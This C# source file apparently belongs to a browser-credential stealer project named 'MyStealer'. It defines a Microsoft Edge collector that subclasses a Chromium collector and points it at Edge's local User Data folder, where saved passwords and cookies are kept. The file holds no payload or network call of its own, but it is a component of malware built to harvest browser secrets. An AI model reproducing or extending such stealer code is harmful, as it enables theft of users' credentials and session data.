using System.IO;
using System;

namespace MyStealer.Collector.Browser.ChromiumBased
{
    public class MicrosoftEdge : Chromium
    {
        public override string Name => "Microsoft Edge";

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft\\Edge\\User Data");
    }
}
